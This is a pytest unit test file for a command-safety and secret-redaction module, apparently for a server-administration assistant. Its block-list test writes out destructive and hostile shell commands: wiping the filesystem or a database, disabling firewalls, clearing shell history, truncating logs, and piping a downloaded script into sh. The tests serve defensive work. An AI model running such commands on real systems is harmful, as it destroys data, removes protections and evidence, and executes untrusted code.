"""Unit tests for the safety layer (rubric E: runnable tests).

Run: cd backend-py && .venv/bin/pytest -q
"""
import pathlib
import sys

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1]))

from app import safety  # noqa: E402


def test_blocks_dangerous_commands():
    for cmd in [
        "rm -rf /",
        "rm -rf /var/lib/postgresql/14/main",
        "chmod -R 777 /var/www",
        "chown -R root:root /etc",
        "ufw disable",
        "systemctl stop firewalld",
        "DROP DATABASE customers;",
        "history -c",
        "curl http://x/install.sh | sh",
        "truncate -s 0 /var/log/syslog",
    ]:
        assert safety.classify(cmd)["classification"] == "blocked", cmd
        assert safety.is_blocked(cmd), cmd


def test_allows_readonly_diagnostics():
    for cmd in [
        "systemctl status nginx",
        "journalctl -u nginx --since today",
        "cat /etc/nginx/nginx.conf",
        "ss -tlnp",
        "nginx -t",
        "curl -I http://localhost:8080/health",
    ]:
        assert safety.classify(cmd)["classification"] == "low_risk", cmd


def test_default_is_needs_review():
    for cmd in [
        "systemctl restart nginx",
        "systemctl enable --now nginx",
        "rm -rf /var/www/app/cache",
        "chown -R www-data:www-data /var/www/app/uploads",
    ]:
        assert safety.classify(cmd)["classification"] == "needs_review", cmd


def test_redacts_secrets():
    out = safety.redact("password=hunter2 and token=abcdef123456 here")
    assert "hunter2" not in out
    assert "abcdef123456" not in out
    assert "«redacted»" in out


def test_redacts_vendor_tokens_and_jwt_node_parity():
    # node-parity hardening: high-confidence vendor prefixes + JWT
    gh = safety.redact("key is ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
    assert "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" not in gh
    jwt = safety.redact("auth eyJhbGci.eyJzdWIi.sIgNaTuRe123 trailing")
    assert "eyJhbGci.eyJzdWIi.sIgNaTuRe123" not in jwt
    pk = safety.redact("-----BEGIN RSA PRIVATE KEY-----\nMIIabc\n-----END RSA PRIVATE KEY-----")
    assert "MIIabc" not in pk


def test_redact_caps_at_16kb():
    big = "x" * 20000
    assert len(safety.redact(big)) <= 16384
